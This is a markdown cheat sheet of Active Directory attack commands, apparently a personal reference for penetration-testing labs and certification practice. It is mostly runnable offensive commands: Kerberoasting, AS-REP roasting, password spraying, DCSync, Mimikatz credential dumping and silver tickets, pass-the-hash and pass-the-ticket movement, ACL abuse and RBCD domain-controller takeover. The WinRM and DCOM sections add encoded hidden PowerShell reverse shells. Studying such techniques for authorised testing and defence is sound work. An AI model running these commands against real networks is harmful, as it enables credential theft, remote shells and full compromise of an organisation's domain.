# Active Directory – Attacking

---

<details open>
<summary><strong>Table of Contents</strong></summary>

<br>

- [Attacking from Kali](#attacking-from-kali)
  - [Enumeration](#enumeration)
    - [User Enumeration](#user-enumeration)
      - [SMB](#smb)
      - [RPC Client](#prcclient)
      - [LDAP](#ldap)

  - [Attacking without password](#attacking-without-password)
    - [ASREPRoast](#asreproast)
    - [Same user and password](#same-user-and-password)
    - [Enumerate shares](#enumerate-shares)
      - [cpassword](#cpassword)

  - [Attacking with credentials](#attacking-with-credentials)
    - [Search for users](#search-for-users)
    - [Kerberoasting](#kerberoasting)
    - [Password Spray](#password-spray)
    - [DCSync](#dcsync)
    - [Pass the hash](#pass-the-hash)
    - [Enumerate shares again](#enumerate-shares-again)
    - [Bloodhound](#bloodhound)

---

- [Attacking from Victim](#attacking-from-victim)

  - [Enumeration](#enumeration-1)

    - [Local Enumeration](#local-enumeration)
      - [PowerView](#powerview)

    - [Manual Enumeration](#manual-enumeration)
      - [Enumerate SPNs](#enumerate-spns)
      - [Enumerate User ACEs](#enumerate-user-aces)
      - [Enumerate Doimain Shares](#enumerate-doimain-shares)

    - [Automated Enumeration](#automated-enumeration)

---

  - [Attacking](#attacking)

    - [Cached AD Credentials](#cached-ad-credentials)
      - [Mimikatz](#mimikatz)
      - [Show Tickets](#show-tickets)

    - [AD Authentication](#ad-authentication)
      - [Passwords attacks](#passwords-attacks)
      - [ASREPRoasting](#asreproasting)
      - [Kerberoasting](#kerberoasting-1)
      - [Silver Tickets](#silver-tickets)
      - [DCSync](#dcsync-1)

---

  - [Lateral movement](#lateral-movement)
    - [WinRM](#winrm)
    - [PsExec](#psexec)
    - [Pass the hash](#pass-the-hash-1)
    - [OverPass the hash](#overpass-the-hash)
    - [Pass the ticket](#pass-the-ticket)
    - [DCOM](#dcom)

---

- [Tips](#tips)
  - [Generate Passwords from Public Usernames](#generate-passwords-from-public-usernames)
  - [Always enumerate shares Twice](#always-enumerate-shares-twice)

---

- [Privileged Groups & Domain Escalation Reference](#privileged-groups--domain-escalation-reference)

  - [Built-in High Privilege Groups](#built-in-high-privilege-groups)
    - [Domain Admins](#domain-admins)
    - [Enterprise Admins](#enterprise-admins)
    - [Administrators (Built-in)](#administrators-built-in)

  - [Delegated Privilege Groups](#delegated-privilege-groups)
    - [Account Operators](#account-operators)
    - [Server Operators](#server-operators)
    - [Backup Operators](#backup-operators)
    - [Print Operators](#print-operators)

  - [Important AD Protection Mechanisms](#important-ad-protection-mechanisms)
    - [AdminSDHolder](#adminsdholder)

  - [Common Escalation Scenarios](#common-escalation-scenarios)
    - [GenericAll over a user](#if-you-have-genericall-over-a-user)
    - [GenericWrite over a user](#if-you-have-genericwrite-over-a-user)
    - [WriteDACL](#if-you-have-writedacl)
    - [Control over a group](#if-you-control-a-group)
    - [RBCD / GenericAll over a Domain Controller](#if-you-have-genericall-over-a-domain-controller-object-or-rights-to-modify-delegation)

  - [Quick Mental Model](#quick-mental-model)

</details>

---

## Attacking from Kali
<details>
<summary><strong>Enumeration</strong></summary>

### Enumeration

Relevant ports: 
```
88 → Kerberos
389 → LDAP
445 → SMB
5985 → WinRM
3268 → Global Catalog
```
Initial full TCP port scan:

```bash
sudo nmap -p- --min-rate 5000 -sS -n -Pn <IP> -oN ports
```

Service enumeration on discovered ports:

```bash
nmap -p$(grep -oP '^\d+(?=/tcp)' ports | paste -sd,) -sCV <IP> -oN services
```
#### User enum

Our goal here is to find valid user names

##### SMB
```bash
smbclient -L //<IP> -N
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> --shares -u 'Guest' -p ''
enum4linux -a <IP>
netexec smb <IP> -u '' -p '' --rid-brute
netexec smb <IP> -u guest -p '' --rid-brute
impacket-lookupsid domain.local/@<IP> -no-pass
impacket-lookupsid domain.local/guest@<IP> -no-pass
```
##### prcclient
```bash
rpcclient -U "" <IP> -N
enumdomusers
```

##### ldap
```bash
ldapsearch -x -H ldap://<IP> -s base
ldapsearch -x -H ldap://<IP> -b "DC=offsec,DC=local"
```
</details>

<details>
<summary><strong>Attacking without password</strong></summary>

### Attacking without password
#### ASREPRoast
TGT hash
```bash
impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip <IP>
```
If hash found
```bash
hashcat -m 18200 hashes.txt rockyou.txt
```
Valida User
```bash
crackmapexec smb <IP> -u 'user' -p 'password' 
```
Try winRM
```bash
crackmapexec winrm <IP> -u 'user' -p 'password'
```
If credentials are valid (`[+]`) and we see Pwned!, connect using Evil-WinRM:
```bash
evil-winrm -i 10.129.5.155 -u user -p 'password'
impacket-psexec corp.com/user:password@<IP>
impacket-wmiexec corp.com/user:password@<IP>
evil-winrm -i 10.129.5.155 -u user -p 'password' -d corp.local
evil-winrm -i 10.129.5.155 -u corp\\user -p 'password'
evil-winrm -i 10.129.5.155 -u user -H <NTLM_HASH>
```

#### Same user and password
```bash
crackmapexec smb <IP> -u users.txt -p users.txt
```
#### Enumerate shares
##### cpassword
```bash
gpp-decrypt <cpassword>
```

</details>

<details>
<summary><strong>Attacking with credentials</strong></summary>

### Attacking with credentials
#### Search for users
```bash
impacket-lookupsid domain/user:password@IP
#Null session
impacket-lookupsid anonymous@IP
impacket-lookupsid domain/guest:@IP

netexec smb <IP> -u user -p password --rid-brute
netexec ldap <IP> -u user -p password --users
netexec smb 10.129.1.137 -u user -p 'password' --users
impacket-GetADUsers domain.local/user:password -dc-ip <IP>
impacket-GetADUsers domain.local/user:password -dc-ip <IP> -all

rpcclient -U "domain.local\\user%password" <IP>
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"
```

#### Kerberoasting
TGS hash
```bash
impacket-GetUserSPNs corp.com/user:Password -dc-ip <IP>
```
If hash found
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```
#### Password Spray
```bash
kerbrute passwordspray -d dominio.local users.txt 'Password123'
```
#### DCSync
```bash
impacket-secretsdump -just-dc-user user corp.com/User:Password@<IP>
```
#### Pass the hash
```bash
impacket-wmiexec -hashes <hash> <user>@<IP>
```
#### Enumerate shares again
```bash
crackmapexec smb <IP> -u "user" -p "password" -d active.htb --shares
```
#### Bloodhound
```bash
sudo neo4j start
sudo neo4j status
cd ~/BloodHound-linux-x64
./BloodHound
bloodhound-python -d dominio.local -u user -p password -ns <IP> -c all
```

---
</details>

## Attacking from Victim
<details>
<summary><strong>Enumeration</strong></summary>

### Enumeration
#### Local Enumeration
```bash
net user /domain
net user <username> /domain
net group /domain
net group "Sales Department" /domain
```
##### PowerView
```bash
Import-Module .\PowerView.ps1
#Get basic domain info
Get-NetDomain
#List all users
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
#Enumerate groups
Get-NetGroup
Get-NetGroup | select cn
#Enumerate specific group
Get-NetGroup "Sales Department" | select member
```

#### Manual Enumeration
```bash
# Operating Systems
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
#Permissions and Logged On Users
Find-LocalAdminAccess
Get-NetSession -ComputerName <name> -Verbose
Get-NetSession -ComputerName files04 -Verbose
#OS version
Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion
#Logged users using PsLoggedOn
.\PsLoggedon.exe \\<name>
.\PsLoggedon.exe \\files04
```
##### Enumerate SPNs
```bash
setspn -L <user>
setspn -L iis_service
# PowerView SPN enumeration
Get-NetUser -SPN | select samaccountname,serviceprincipalname
#If a web server is found
nslookup.exe <IP>
```
##### Enumerate user ACEs
```bash
# Permissions

- GenericAll: Full control over the object (complete takeover possible).
- GenericWrite: Can modify object attributes (e.g., add SPN, modify properties).
- WriteOwner: Can change the owner of the object (owner can modify ACL).
- WriteDACL: Can modify permissions (ACL) of the object.
- AllExtendedRights: Includes extended rights such as password reset.
- ForceChangePassword: Can reset the password without knowing the current one.
- Self: Can modify certain attributes of the object (sometimes allows self-group addition).
```

```bash
# Commands
Get-ObjectAcl -Identity <user>
Get-ObjectAcl -Identity stephanie
#Convert SID to name
Convert-SidToName <ObjectSID>
#Check GenericAll permissions
Get-ObjectAcl -Identity "Management Department" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
#Add user to group
net group "Management Department" stephanie /add /domain
#Confirm membership
Get-NetGroup "Management Department" | select member
#Remove user
net group "Management Department" stephanie /del /domain
```

Abuse Examples
```powershell
# Reset user password (GenericAll / ForceChangePassword / AllExtendedRights)
Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
# Add user to a group (if you control the group)
net group "Management Department" stephanie /add /domain
# Confirm membership
Get-NetGroup "Management Department" | select member
# Remove user from group
net group "Management Department" stephanie /del /domain
```
Typical Abuse Scenarios
```bash
#If you have GenericAll over a user → Full account takeover. (Resourced PG)
Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# If you have GenericAll over a Domain Controller object
# (or sufficient rights to modify msDS-AllowedToActOnBehalfOfOtherIdentity)
→ Potential Full Domain Controller compromise via RBCD (Resource-Based Constrained Delegation)

This attack allows impersonation of any user (including Administrator / SYSTEM)
on the target Domain Controller if you can control or create a machine account.

---

# 1. Create or control a machine account in the domain
impacket-addcomputer <domain>/<user>:<password> \
-dc-ip <DC_IP> \
-computer-name <FAKE_COMPUTER>$ \
-computer-pass <PASSWORD>

---

# 2. Configure Resource-Based Constrained Delegation on the target (DC)
rbcd.py -dc-ip <DC_IP> \
-action write \
-delegate-to <DC_NAME>$ \
-delegate-from <FAKE_COMPUTER>$ \
<domain>/<user>:<password>

---

# 3. Request service ticket (S4U2Self + S4U2Proxy)
impacket-getST -spn cifs/<dc_fqdn> \
<domain>/<fake_computer>$:<password> \
-impersonate Administrator \
-dc-ip <DC_IP>

---

# 4. Load the Kerberos ticket
export KRB5CCNAME=<TICKET_FILE>.ccache

---

# 5. Execute commands on the Domain Controller as the impersonated user
impacket-psexec -k -no-pass <dc_fqdn>

#If you have GenericWrite over a user → Add fake SPN → Kerberoast.
Set-ADUser -Identity websvc `
-ServicePrincipalNames @{Add='fake/http'}
## From kali
impacket-GetUserSPNs domain.local/user:password -dc-ip <IP>
hashcat -m 13100 hashes.txt rockyou.txt

#If you have WriteDACL → Grant yourself GenericAll → Takeover.
Add-DomainObjectAcl -TargetIdentity dave -PrincipalIdentity stephanie -Rights All
##Then reset password:
Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

#If you have WriteOwner → Become owner → Modify ACL → Escalate.
Set-DomainObjectOwner -Identity "Management" -OwnerIdentity stephanie
## Now grant yourself full rights:
Add-DomainObjectAcl -TargetIdentity "Management" -PrincipalIdentity stephanie -Rights All
net group "Management" stephanie /add /domain

#If you have rights over a privileged group → Add yourself → Privilege escalation.
net group "Domain Admins" stephanie /add /domain
Get-NetGroup "Domain Admins" | select member
```

##### Enumerate Doimain Shares
```bash
Find-DomainShare
#Check accessible shares
Find-DomainShare -CheckShareAccess
#View specific share
ls \\dc1.corp.com\sysvol\corp.com\
#Decrypt GPP password
gpp-decrypt <password>
```
#### Automated Enumeration
```bash
#Sharphound Collection
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop -OutputPrefix "corp audit"
```


</details>

<details>
<summary><strong>Attacking</strong></summary>

### Attacking
#### Cached AD Credentials
##### Mimikatz
```bash
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
##### Show tickets
```bash
./mimikatz.exe
privilege::debug
sekurlsa::tickets
```
#### AD Authentication
##### Passwords attacks
```bash
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "password"
```
##### ASREPRoasting
```bash
.\Rubeus.exe asreproast /nowrap
```

##### Kerberoasting
```bash
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

##### Silver Tickets
```bash
#Mimikatz
#Get SPN hash
privilege::debug
sekurlsa::logonpasswords
#Obtain domain SID
whoami /user
#Create silver ticket
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
#Check tickets in memory:
klist
#Access the web page as jeffadmin:
iwr -UseDefaultCredentials http://web04
```

##### DCSync
```bash
#Mimikatz
lsadump::dcsync /user:corp\dave
#We copy the hash and crack it on kali usong hashcat
```
</details>
<details>
<summary><strong>Lateral movement</strong></summary>

### Lateral movement
#### WinRM
```bash
winrs -r:server -u:user -p:password  "cmd /c hostname & whoami"
# Encoded revershell
winrs -r:files04 -u:jen -p:password  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

#### PsExec
```bash
.\PsExec64.exe -i  \\server -u corp\<user> -p password cmd
```   

#### Pass the hash
```bash
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```   
#### OverPass the hash
```bash
#Mimikatz
sekurlsa::logonpasswords
sekurlsa::pth /user:user /domain:corp.com /ntlm:<HASH> /run:powershell
#Generate TGT via network share
net use \\share
#Run PsExec remotely as user
.\PsExec.exe \\share cmd
``` 

#### Pass the ticket
```bash
#Mimikatz
sekurlsa::tickets /export
 kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
``` 

#### DCOM
```bash
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
``` 

</details>

---
## Tips
<details>
<summary><strong>Tips</strong></summary>

### Generate Passwords from Public Usernames

```bash
#Sometimes a company website exposes full employee names. Example Lorem Ipsum
#Instead of using only generic wordlists, generate custom users based on common username formats
loremipsum
lorem.ipsum
lipsum
l.ipsum
lorem.i
ipsuml
ipsum.l

kerbrute userenum -d domain.local --dc <IP> users.txt
crackmapexec smb <IP> -u users.txt -p 'whatever'
``` 
### Always enumerate shares Twice
```bash
#Without credentials
crackmapexec smb <IP> --shares -u '' -p ''

#With credentials
crackmapexec smb <IP> --shares -u user -p password
``` 
</details>

# Privileged Groups & Domain Escalation Reference

---

# Built-in High Privilege Groups

---

##  Domain Admins

**Full domain control**

Members of this group have complete control over the domain.

### Can:
- Create/delete users
- Reset any password
- Modify any group
- Modify GPOs
- Perform DCSync
- Access all domain machines as local admin
- Log in to Domain Controllers

### Typical Abuse:
```powershell
net group "Domain Admins" user /add /domain
```

---

## 🏛 Enterprise Admins

**Forest-wide control**

This group exists only in multi-domain forests.

### Can:
- Full control across all domains in the forest
- Modify forest configuration
- Schema modification
- Add Domain Admins in any domain

⚠ Extremely sensitive group.

---

##  Administrators (Built-in)

Built-in local administrators group on Domain Controllers.

### Can:
- Full control over the Domain Controller
- Equivalent to Domain Admin on the DC
- Manage services, registry, files, security settings

---

# Delegated Privilege Groups

---

## 🛠 Account Operators

Delegated administrative group.

### Can:
- Create new users
- Create new groups
- Modify normal users
- Reset passwords (non-protected users)

### Cannot:
- Modify Domain Admins
- Modify Enterprise Admins
- Modify protected users (AdminSDHolder)
- Modify Schema Admins

### Typical Abuse:
```powershell
net user pwned P@ssw0rd123! /add /domain
net group "Some Group" pwned /add /domain
```

---

##  Server Operators

### Can:
- Log onto Domain Controllers
- Start/stop services
- Backup/restore files
- Potential privilege escalation via service abuse

---

## 🖥 Backup Operators

### Can:
- Bypass file permissions
- Read any file on DC (including NTDS.dit)
- Potential offline hash extraction

---

## 🛠 Print Operators

### Can:
- Manage printers on DC
- Historically exploitable for privilege escalation (e.g., PrinterBug)

---

# Important AD Protection Mechanisms

---

##  AdminSDHolder

- Protects privileged accounts
- Applies every 60 minutes
- Prevents delegated permission abuse on protected users

Protected groups include:
- Domain Admins
- Enterprise Admins
- Schema Admins
- Administrators

---

# Common Escalation Scenarios

---

## If you have GenericAll over a user:
```powershell
Set-ADAccountPassword -Identity victim -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

---

## If you have GenericWrite over a user:
Add fake SPN → Kerberoast
```powershell
Set-ADUser -Identity victim -ServicePrincipalNames @{Add='fake/http'}
```

---

## If you have WriteDACL:
Grant yourself full rights:
```powershell
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
```

---

## If you control a group:
Add yourself:
```powershell
net group "Target Group" attacker /add /domain
```

---


## If you have GenericAll over a Domain Controller object (or rights to modify delegation):
**Case use: Full Domain Controller compromise via RBCD (Resource-Based Constrained Delegation)**
RBCD requires:
- Machine account creation OR control
- msDS-AllowedToActOnBehalfOfOtherIdentity write permission
Export Kerberos ticket:

```bash
export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```
Add target resolution (optional but common fix for name resolution issues):

```bash
echo "192.168.182.175 resourcedc.resourced.local resourcedc" | sudo tee -a /etc/hosts
```
Abuse RBCD by creating a machine account and delegating access:

```bash
sudo python3 rbcd.py -dc-ip 192.168.182.175 -action write -delegate-to RESOURCEDC$ -delegate-from griffyn$ -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 resourced.local/L.Livingstone
```
Request service ticket (S4U impersonation):
```bash
impacket-getST -spn cifs/resourcedc.resourced.local resourced/griffyn$:griffyn -impersonate Administrator -dc-ip 192.168.182.175
```
Use ticket:
```bash
export KRB5CCNAME=Administrator.ccache
```
Execute remote commands as SYSTEM:
```bash
impacket-psexec -k -no-pass resourcedc.resourced.local
```
# Quick Mental Model

| Group | Scope | Risk Level |
|-------|-------|------------|
| Domain Admins | Domain | Critical |
| Enterprise Admins | Forest | Critical |
| Administrators | Domain Controller | Critical |
| Account Operators | Delegated | High |
| Backup Operators | DC File Access | High |
| Server Operators | DC Services | High |
